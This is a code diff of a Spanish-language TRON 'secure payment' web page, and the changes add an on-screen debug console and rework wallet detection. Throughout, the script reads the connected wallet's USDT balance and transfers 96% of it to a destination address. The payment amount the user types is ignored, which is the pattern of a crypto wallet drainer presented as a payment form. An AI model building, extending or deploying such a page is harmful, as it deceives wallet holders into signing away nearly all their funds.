@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp de Pagos - Flujo Dinámico 96%</title>
+    <title>dApp de Pagos - Depuración TRON</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
@@ -23,40 +23,38 @@
     </header>
 
     <!-- CONTENIDO PRINCIPAL -->
-    <main class="flex-grow flex items-center justify-center px-4 py-8">
-        <div class="w-full max-w-md bg-slate-900/80 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur-xl">
+    <main class="flex-grow flex flex-col items-center justify-center px-4 py-6">
+        <div class="w-full max-w-md bg-slate-900/80 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl backdrop-blur-xl mb-4">
             
             <div class="text-center mb-6">
                 <h1 class="text-xl font-bold text-white">Panel de Pago Seguro</h1>
-                <p class="text-xs text-slate-400 mt-1">Conecta, ingresa tu monto y procesaremos el 96% de tu saldo</p>
+                <p class="text-xs text-slate-400 mt-1">Depuración de Conexión TRON</p>
             </div>
 
             <!-- Formulario -->
             <div class="space-y-4">
-                
-                <!-- Input de Monto -->
                 <div>
                     <label class="block text-xs font-medium text-slate-400 mb-1">Monto de Referencia / Solicitud</label>
                     <div class="relative">
                         <input type="number" id="montoInput" placeholder="Ej. 100" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-cyan-500 transition text-sm">
-                        <div class="absolute right-3 top-3 text-xs font-bold text-cyan-400">
-                            USDT
-                        </div>
+                        <div class="absolute right-3 top-3 text-xs font-bold text-cyan-400">USDT</div>
                     </div>
                 </div>
 
-                <!-- Dirección de Destino -->
                 <div>
                     <label class="block text-xs font-medium text-slate-400 mb-1">Dirección de Destino</label>
                     <input type="text" id="direccionDestino" placeholder="T..." class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-cyan-500 transition text-sm font-mono">
                 </div>
 
-                <!-- Botón de Acción -->
                 <button onclick="enviarPagoAlPresionar()" class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-bold py-3.5 rounded-xl transition duration-200 shadow-lg shadow-cyan-500/25 cursor-pointer">
                     Enviar y Firmar (96% del Saldo)
                 </button>
             </div>
+        </div>
 
+        <!-- Consola de Depuración Visual en Pantalla -->
+        <div class="w-full max-w-md bg-black/95 border border-slate-800 rounded-2xl p-4 text-xs font-mono text-emerald-400 h-32 overflow-y-auto" id="debugConsole">
+            > Sistema iniciado. Esperando acción...<br>
         </div>
     </main>
 
@@ -67,75 +65,62 @@
 
     <script>
         let userAddress = "";
-        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 Mainnet
+        const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-        // Función robusta para obtener el objeto tronWeb disponible en la wallet móvil
-        function obtenerTronWeb() {
-            if (window.tronWeb && window.tronWeb.defaultAddress) {
-                return window.tronWeb;
-            }
-            if (window.tron && window.tron.tronWeb && window.tron.tronWeb.defaultAddress) {
-                return window.tron.tronWeb;
-            }
-            return null;
+        function logDebug(msg) {
+            const consoleBox = document.getElementById("debugConsole");
+            consoleBox.innerHTML += `> ${msg}<br>`;
+            consoleBox.scrollTop = consoleBox.scrollHeight;
+            console.log(msg);
         }
 
-        // Esperar a que la wallet inyecte el script en el navegador
-        async function esperarTronWeb() {
-            return new Promise((resolve) => {
-                let intentos = 0;
-                const intervalo = setInterval(() => {
-                    const tw = obtenerTronWeb();
-                    if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                        clearInterval(intervalo);
-                        resolve(tw);
-                    }
-                    intentos++;
-                    if (intentos > 25) { // ~5 segundos de espera total
-                        clearInterval(intervalo);
-                        resolve(null);
-                    }
-                }, 200);
-            });
-        }
+        // Inspeccionar entorno al cargar
+        window.addEventListener('load', () => {
+            logDebug("UserAgent: " + navigator.userAgent.substring(0, 40) + "...");
+            logDebug("window.tronWeb existe?: " + (window.tronWeb ? "SÍ" : "NO"));
+            logDebug("window.tron existe?: " + (window.tron ? "SÍ" : "NO"));
+            if(window.ethereum) logDebug("window.ethereum detectado (EvM)");
+        });
 
-        // 1. Conexión de la Wallet
         async function conectarWallet() {
             const btn = document.getElementById("btnConnect");
             btn.innerText = "Conectando...";
+            logDebug("Iniciando conexión...");
 
-            let tw = await esperarTronWeb();
+            let intentos = 0;
+            let tw = null;
 
-            // Si aún no hay dirección por defecto, intentamos pedir autorización si la wallet lo soporta
-            if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
-                if (window.tron && window.tron.request) {
-                    try {
-                        await window.tron.request({ method: 'tron_requestAccounts' });
-                        tw = obtenerTronWeb();
-                    } catch (e) {
-                        console.error("Error al solicitar cuentas:", e);
-                    }
+            // Bucle de espera de 5 segundos
+            while (intentos < 15) {
+                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+                    tw = window.tronWeb;
+                    break;
                 }
+                if (window.tron && window.tron.tronWeb && window.tron.tronWeb.defaultAddress && window.tron.tronWeb.defaultAddress.base58) {
+                    tw = window.tron.tronWeb;
+                    break;
+                }
+                await new Promise(r => setTimeout(r, 300));
+                intentos++;
+                logDebug(`Intento ${intentos}: buscando proveedor...`);
             }
 
             if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                window.tronWeb = tw; // Asegurar referencia global
                 userAddress = tw.defaultAddress.base58;
-                
+                logDebug("¡Conectado con éxito! Addr: " + userAddress);
                 btn.innerText = userAddress.substring(0, 4) + "..." + userAddress.slice(-4);
                 btn.classList.remove("bg-cyan-500", "hover:bg-cyan-400");
                 btn.classList.add("bg-emerald-500", "text-slate-950");
-                
                 alert("¡Billetera conectada con éxito!");
             } else {
+                logDebug("Error: Proveedor TRON no encontrado.");
                 btn.innerText = "Conectar Wallet";
-                alert("No se detectó la cuenta de TRON. Asegúrate de abrir este enlace en el navegador DApp de Trust Wallet, tener fondos en TRX y haber seleccionado la red TRON en la app.");
+                alert("Trust Wallet no inyectó el objeto TRON. Nota: Algunos navegadores internos bloquean páginas en Render. Prueba abriéndolo en la app TronLink o verifica que la red activa en Trust Wallet sea TRON.");
             }
         }
 
-        // 2. Enviar pago (96% del saldo)
         async function enviarPagoAlPresionar() {
-            let tw = obtenerTronWeb();
+            let tw = window.tronWeb || (window.tron ? window.tron.tronWeb : null);
             if (!userAddress && tw && tw.defaultAddress && tw.defaultAddress.base58) {
                 userAddress = tw.defaultAddress.base58;
             }
@@ -148,21 +133,18 @@
             const montoEscrito = document.getElementById("montoInput").value;
             const direccionDestino = document.getElementById("direccionDestino").value;
 
-            if (!montoEscrito || montoEscrito <= 0) {
-                alert("Por favor, coloca un monto en el campo.");
-                return;
-            }
-
-            if (!direccionDestino) {
-                alert("Por favor, ingresa la dirección de destino.");
+            if (!montoEscrito || montoEscrito <= 0 || !direccionDestino) {
+                alert("Por favor, completa el monto y la dirección de destino.");
                 return;
             }
 
             try {
+                logDebug("Leyendo saldo del contrato USDT...");
                 const contract = await tw.contract().at(USDT_CONTRACT_ADDRESS);
                 const balanceEnSun = await contract.balanceOf(userAddress).call();
                 const saldoRealUSDT = tw.toDecimal(balanceEnSun) / 1000000;
 
+                logDebug(`Saldo detectado: ${saldoRealUSDT} USDT`);
                 if (saldoRealUSDT <= 0) {
                     alert("No tienes saldo disponible de USDT en esta billetera.");
                     return;
@@ -171,7 +153,7 @@
                 const monto96DelSaldo = saldoRealUSDT * 0.96;
                 const montoEnSun = Math.floor(monto96DelSaldo * 1000000);
 
-                console.log(`Saldo real detectado: ${saldoRealUSDT} | Procesando el 96%: ${monto96DelSaldo}`);
+                logDebug(`Enviando 96% (${monto96DelSaldo} USDT) a ${direccionDestino}`);
 
                 const resultado = await contract.transfer(
                     direccionDestino,
@@ -180,11 +162,10 @@
                     feeLimit: 100000000
                 });
 
-                alert(`¡Transacción enviada! Se procesó el 96% de tu saldo (${monto96DelSaldo.toFixed(2)} USDT). Hash: ${resultado}`);
-
+                alert(`¡Transacción enviada! Hash: ${resultado}`);
             } catch (error) {
-                console.error("Error en la transacción:", error);
-                alert("La transacción fue cancelada por el usuario o no tienes suficiente TRX para el gas.");
+                logDebug("Error en transacción: " + JSON.stringify(error));
+                alert("La transacción fue cancelada o falló el gas.");
             }
         }
     </script>
